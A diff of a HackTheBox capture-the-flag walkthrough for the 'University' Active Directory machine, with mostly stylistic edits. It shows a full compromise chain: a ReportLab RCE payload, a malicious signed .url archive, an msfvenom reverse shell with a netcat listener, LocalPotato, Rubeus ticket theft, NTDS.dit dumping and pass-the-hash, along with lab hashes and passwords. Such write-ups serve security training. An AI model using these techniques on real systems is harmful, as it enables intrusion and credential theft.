@@ -7,10 +7,10 @@ categories: ['HackTheBox', 'Active-Directory', 'Windows']
 
 ![](/assets/images/headers/University.png)
 
-# Synopsis
+## Synopsis
 University is an Insane Windows Active Directory machine that starts with a university webpage. The web application allows exporting user profile pages to a PDF using `xhtml2pdf`, which is vulnerable to a Remote Code Execution vulnerability via [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/CVE-2023-33733). This allows getting initial access to the machine. Subsequently, the account of a professor is compromised using a forged certificate. With the professor's account, a malicious archive file is uploaded to exploit [CVE-2023-36025](https://nvd.nist.gov/vuln/detail/CVE-2023-36025), which allows getting Remote Code Execution as the user who extracts the archive. A relay attack is then meticulously set up to perform an unconstrained delegation attack. On the newly compromised computer, the Kerberos ticket for a new user is extracted, enabling the reading of the password of a group-managed service account. This account can impersonate the domain Administrator, thus compromising the entire environment.
 
-# Enumeration
+## Enumeration
 First thing we do is sign up for an account on the `university.htb` site. While that’s cooking in the background, we’re also multitasking like it’s finals week by running kerbrute to find some valid users in the domain.
 
 ```console
@@ -26,7 +26,7 @@ $ kerbrute userenum -d university.htb --dc 10.10.11.39 james.m-x142844.txt
 2024/12/22 13:35:40 >  [+] VALID USERNAME:   kai.k@university.htb
 ```
 
-We now have a nice starter pack of usernames — professors, students, maybe that one guy who still emails in Comic Sans. Once we log in, we peep this feature that lets you request a signed certificate. The site hits us with:
+We now have a nice starter pack of usernames — professors, students, maybe that one guy who still emails in Comic Sans. Once we log in to the site, we peep this feature that lets you request a signed certificate. The site hits us with:
 
 ```
 You can use it for login without need for credentials, deleting your account and uploading new lectures(for professors only).
@@ -67,14 +67,14 @@ Department: Information Systems Security
 
 Now obviously, my villain arc would be to make a cert for George and sneak into professor-only land... but the site says “nah fam” if we try to sign a cert for anyone we’re not logged in as. So for now — we’re locked to our own account cert. We ball later.
 
-# Foothold
-So while poking around the site in my “click every button like a toddler” era, I notice this cute lil’ `Export Profile to PDF` feature. Being the nosy guy I am, I yeet that file into exiftool to check metadata.
+## Foothold
+So while poking around the site in my “click every button like a toddler” era, I notice this cute lil’ `Export Profile to PDF` feature. Being the nosy menace I am, I yeet that file into exiftool like:
 
 ```console
 $ exiftool profile.pdf
 ```
 
-Boom — ReportLab shows up in the metadata. Turns out, ReportLab has [CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733), a vuln so spicy it lets you slip arbitrary Python code into a PDF's content and get RCE. So naturally, I stuffed my bio with something... special:
+Boom — ReportLab shows up in the metadata like "hey bestie, wanna pwn me!". Turns out, ReportLab has [CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733), a vuln so unhinged it basically lets you cosplay as the server’s Python interpreter. Like bruh, imagine putting your resume into LinkedIn and suddenly LinkedIn starts running your shell commands. So naturally, I stuffed my bio with something... special:
 
 ```html
 <para>
@@ -105,12 +105,14 @@ PS C:\Web\University> whoami
 university\wao
 ```
 
-# User
-I’m chilling in my fresh shell as `university\wao` when I check my group memberships and see I'm in `Remote Management Users`. That basically means if I can get this user's password, I can hop in through WinRM like it's nothing.
+## User
+I’m chilling in my fresh shell as `university\wao`, feeling like I just unlocked a secret character skin, when I peep my group memberships... Remote Management Users. So if I can snag this user’s password, I get to WinRM my way in like it’s the VIP lounge at cyberclub.
 
-I start creeping around the filesystem like a raccoon on a snack run and eventually find a folder called `C:\Web\DB Backup`. Yeah... they really put “Backup” in the name and thought I wouldn’t look. Inside, I see a PowerShell script named `db-backup-automator.ps1`. The name alone is giving "developer left something juicy in here", so you already know I’m opening that thing up looking for hardcoded creds or connection strings.
+So I start creeping around the filesystem like a raccoon on a 3 AM 7-Eleven snack run, nosing in everything, praying for leftover pizza crusts (aka plaintext creds). And what do I stumble on? A folder literally named `C:\Web\DB Backup`. Yeah... they really put “Backup” in the name and thought I wouldn’t look.
 
-```console
+Inside, I find a PowerShell script called `db-backup-automator.ps1`. And let me tell you — the vibes are immaculate. That filename alone is giving “I hardcoded something spicy in here but gaslit myself into thinking no one would ever find it.” Naturally, I’m opening that thing faster than I open DoorDash when I’m in my snack phase.
+
+```powershell
 PS C:\Web\DB Backups> cat db-backup-automator.ps1
 cat db-backup-automator.ps1
 $sourcePath = "C:\Web\University\db.sqlite3"
@@ -138,7 +140,7 @@ And now I’m just sitting here like, pls work, because if it does, we’re abou
 
 Pulled the `db.sqlite3` straight off the server with Evil-WinRM — feeling like the main character already. Peep inside the DB and we got user creds and CSR file locations. 
 
-```console
+```sql
 sqlite> select id,username,password,csr,user_type from University_customuser;
 
 2|george|pbkdf2_sha256$600000$igb7CzR3ivxQT4urvx0lWw$dAfkiIa438POS8K8s2dRNLy2BKZv7jxDnVuXqbZ61+s=||Professor
@@ -191,8 +193,6 @@ cJxT1hFdCYlYZ1chHGSU6yRArmoGiIOjM/19yDhzjiRyd8MeosIl2Vq/czA=
 -----END CERTIFICATE-----
 ```
 
-Slide into the site as Martin.
-
 ![](/assets/images/writeups/university/lecture-upload.png)
 
 Professors can upload lectures, but the files need to be signed. Cool, so I spin up a GPG key for our fake professor and decide to get messy with it.
@@ -207,8 +207,7 @@ You selected this USER-ID:
 
 $ gpg --export -a "martin.rose" > GPG-public-key.asc
 ```
-
-A `.url` file in our ZIP? Oh yeah, that’s free real estate for pointing to malicious scripts. Drop a batch file on `C:\Windows\Temp`, zip a link to it, sign it, upload it. Wait for the magic...
+Since this machine has not been updated for some time, we can suspect it being vulnerable to [CVE-2023-36025](https://github.com/ka7ana/CVE-2023-36025). So I cook up the most suspicious shortcut of all time: drop a batch file on `C:\Windows\Temp`, yeet a `.url` link to it inside a ZIP, slap a signature on it like I’m forging hall passes, and then upload it for the Content Evaluators like, “hey bestie, pls click my totally legit file ❤️.”
 
 ```console
 $ cat link.url 
@@ -220,7 +219,7 @@ $ zip Lecture.zip link.url
 $ gpg -u "martin.rose" --detach-sign Lecture.zip
 ```
 
-Except... crickets. No callback. Alright, pivot time. Ping sweep the `192.168.99.0/24` subnet, find `WS-3` and `LAB-2` just chilling. Fire up [Ligolo-ng](https://github.com/nicocha30/ligolo-ng), proxy up, route the subnet, and remote into WS-3 like it’s my side chick.
+Except... crickets. No callback. Alright, pivot time. Ping sweep the `192.168.99.0/24` subnet, find `WS-3` and `LAB-2` just chilling. Fire up [Ligolo-ng](https://github.com/nicocha30/ligolo-ng), proxy up, route the subnet, and remote into `WS-3` like it’s my side chick.
 
 ```console
 $ sudo ip tuntap add user $USER mode tun ligolo
@@ -243,7 +242,7 @@ $ sudo su
 root@LAB-2:#
 ```
 
-Alright, so plot twist time — instead of begging the main server to run our payload, we switch to “what if WS-3 does the heavy lifting?” energy. The idea: if a file gets opened from WS-3, we can make it point straight to LAB-2 and skip all the drama. So I tweak my reverse shell to target `LAB-2`'s IP (192.168.99.12) instead:
+Alright, so plot twist time — instead of begging the main server to run our payload, we switch to “what if `WS-3` does the heavy lifting?” energy. The idea: if a file gets opened from `WS-3`, we can make it point straight to `LAB-2` and skip all the drama. So I tweak my reverse shell to target `LAB-2`'s IP (192.168.99.12) instead:
 
 ```console
 $ msfvenom -p cmd/windows/reverse_powershell lhost=192.168.99.12 lport=1337 > rev.bat
@@ -253,7 +252,7 @@ WS-3
 *Evil-WinRM* PS C:\Windows\Temp> upload shell.bat
 ```
 
-Now the plan is simple: craft the .url file so it points at that batch file living on WS-3. As soon as some unsuspecting professor/admin clicks the shortcut, WS-3 will execute it, and boom — the callback will land right in LAB-2’s waiting arms.
+Now the plan is simple: craft the `.url` file so it points at that batch file living on `WS-3`. As soon as some unsuspecting professor/admin clicks the shortcut, `WS-3` will execute it, and boom — the callback will land right in `LAB-2`’s waiting arms.
 
 ```console
 root@LAB-2:# nc -nlvp 1337
@@ -272,7 +271,7 @@ Best regards.
 Help Desk team - Rose Lanosta.
 ```
 
-# Root
+## Root
 Right — now that we’ve got `Martin.T` on `WS-3`, that “not updated since 10/29/2023” note is basically a neon sign saying “Potato season is open”. The date is hinting to the latest Potato exploit called [LocalPotato](https://github.com/decoder-it/LocalPotato) (a.k.a CVE-2023-21746). This exploit makes it possible to overwrite any file on the server, so let's look for things that seem worthwhile.
 
 One file at `C:\Program Files\Automation-Scripts\wpad-cache-cleaner.ps1` seems to be an automated cleanup script. If this script runs with higher privileges (scheduled task, service, or startup script), swapping it out for our payload means the next time it runs, we get a SYSTEM or admin shell.
@@ -332,7 +331,7 @@ ws-3\administrator
 
 That’s full local admin on `WS-3`. Now there are several ways to get the root flag. 
 
-## Method 1
+### Method 1
 Ok so first move — dump any user Kerberos tickets from memory and pray we find one. Run Rubeus, dump all tickets, jackpot — Rose's TGT is just sitting there in memory like it’s on clearance. We grab that Base64 ticket, renew it, and inject it straight into our current session with `/ptt`.
 
 ```powershell
@@ -401,7 +400,7 @@ Calculating hashes for Current Value
 [*]       des_cbc_md5          : FB7F0DF2EACE5E76
 ```
 
-Since `GMSA-PClient01$` is AllowedToAct on the DC, we use Rubeus S4U to impersonate the administrator, requesting a service ticket for CIFS and WinRM on the DC. We inject that ticket, klist again, and it straight up says `Client: administrator @ UNIVERSITY.HTB`.
+Since `GMSA-PClient01$` is `AllowedToAct` on the DC, we use Rubeus S4U to impersonate the administrator, requesting a service ticket for CIFS and WinRM on the DC. We inject that ticket, klist again, and it straight up says `Client: administrator @ UNIVERSITY.HTB`. Thats root baby!
 
 ```console
 PS C:\tmp> .\Rubeus.exe s4u /user:GMSA-PCLIENT01$ /rc4:0D333F335FDA7915C9B62D37056351C6 /impersonateuser:administrator /msdsspn:cifs/DC.university.htb /altservice:winrm /ptt
@@ -426,7 +425,7 @@ PS C:\tmp> type \\dc.university.htb\c$\users\Administrator\Desktop\root.txt
 <REDACTED>
 ```
 
-## Method 2
+### Method 2
 Another option we have is to dump the SAM database (download it with session in Evil-WinRM). Then we run `secretsdump.py` to to spit out every hash in the system, including the golden ticket: a default password chilling in plaintext.
 
 ```console
@@ -467,7 +466,7 @@ Run it against `ad_users.txt` with NetExec, and guess what? `Brose.W` is just wa
 
 ![](/assets/images/writeups/university/BH-brose.w.png)
 
-Fire up Evil-WinRM as Brose.W, drop diskshadow `.dsh` script, spin up a shadow copy, expose it to Z:, robocopy the NTDS.dit and SYSTEM.SAV like it’s Hot Wheels. Download them, feed them to `secretsdump.py`, and it’s raining domain hashes.
+We fire up Evil-WinRM as Brose.W, drop diskshadow `.dsh` script, spin up a shadow copy, robocopy the NTDS.dit like it’s Hot Wheels. Download them, feed them to `secretsdump.py`, and it’s raining domain hashes.
 
 ```console
 $ evil-winrm -i 10.10.11.39 -u 'university.htb\brose.w' -p 'v3ryS0l!dP@sswd#X'
@@ -513,7 +512,7 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:41c4599e48661690fa6538fe96d366de:::
 <SNIP>
 ```
 
-Final move? Administrator hash in hand, Pass-the-Hash time. SMB to the DC, grab root.txt, sit back, sip whatever beverage hackers sip while the domain collapses in slow motion.
+Final move? We got the Administrator hash in our hands, meaning it is Pass-the-Hash time. We SMB to the DC, grab root.txt, sit back, sip whatever beverage hackers sip while the domain collapses in slow motion.
 
 ```console
 $ nxc smb 10.10.11.39 -u 'Administrator' -H 'e63413bab01a0b8820983496c0be3a9a' -x 'cat C:\Users\Administrator\Desktop\root.txt'
